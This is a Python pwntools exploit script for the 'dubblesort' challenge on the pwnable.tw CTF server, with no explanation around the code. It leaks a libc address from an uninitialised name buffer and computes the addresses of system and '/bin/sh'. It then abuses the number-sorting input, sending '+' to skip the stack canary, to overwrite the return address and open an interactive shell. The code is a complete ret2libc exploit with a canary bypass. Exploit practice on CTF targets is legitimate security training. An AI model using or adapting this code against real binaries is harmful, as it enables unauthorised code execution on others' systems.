#!/usr/bin/env python
from pwn import *

context.log_level='debug'

debug=0
if debug:
	p=process(argv=['./dubblesort'],env={"LD_PRELOAD":"./libc_32.so.6"})
else:
    p=remote('chall.pwnable.tw',10101)

p.recvuntil('What your name :')

p.send('a'*4*7)

p.recvuntil('Hello ')
p.recvuntil('a'*28)

libc=u32(p.recv()[0:4])
print(hex(libc))

libc_base=libc-0x1ae244 #-0x1b0244+0x2000
print(hex(libc_base))

one_off=0x3a819
one_off=0x5f065
#one_off=0x5f066
one=libc_base+one_off

bin_off=0x158e8b
bin_sh=libc_base+bin_off
system_off=0x3a940
system_libc=libc_base+system_off


p.sendline('35')                                       
														

for i in range(24):
    	p.recvuntil('number : ')             # 24 
    	p.sendline('0')

raw_input('#')
p.recvuntil('number : ')
p.sendline('+')                             # canary 25                                   
#gdb.attach(p,'nb b16')

for i in range(7):                          #   31  
	p.recvuntil('number : ')
	p.sendline(str(system_libc))


print("base"+hex(libc_base))
print("binstr"+hex(bin_sh))
print("system"+hex(system_libc))

p.recvuntil('number : ')
p.sendline(str(system_libc))             
p.recvuntil('number : ')
p.sendline(str(system_libc+1))
p.recvuntil('number : ')
p.sendline(str(bin_sh))


p.interactive()